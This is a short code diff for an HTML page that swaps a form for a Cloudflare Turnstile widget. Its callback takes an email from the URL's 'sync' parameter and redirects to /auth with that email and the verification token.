@@ -2,18 +2,30 @@
 <head>
     <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
     <link href="/static/css/output.css" rel="stylesheet">
+    <script>
+        // Function to extract email from URL query parameters
+        function getEmailFromQuery() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('sync'); // Get the 'sync' parameter which holds the email
+        }
+
+        // Callback function for Turnstile success
+        function onTurnstileSuccess(token) {
+            const email = getEmailFromQuery();  // Extract email from the current URL
+            if (email) {
+                // Redirect to /auth with both Turnstile token and email in the query string
+                window.location.href = "/auth?sync=" + encodeURIComponent(email) + "&cf-turnstile-response=" + token;
+            } else {
+                // Fallback in case the email is missing
+                alert("Email parameter is missing in the URL.");
+            }
+        }
+    </script>
 </head>
 <body class="flex flex-col justify-center items-center h-screen w-screen">
-    <form action="/auth" method="GET">
-        <input type="hidden" name="cf-turnstile-response" id="cf-turnstile-response">
-        <div class="cf-turnstile" data-sitekey="0x4AAAAAAAx8Hjjc0l14Qawb"></div>
-        <!-- <button type="submit">Verify</button> -->
-    </form>
+    <div class="cf-turnstile"
+        data-sitekey="0x4AAAAAAAx8Hjjc0l14Qawb"
+        data-callback="onTurnstileSuccess"
+        data-action="verify"></div>
 </body>
 </html>
-
-
-
-
-
-
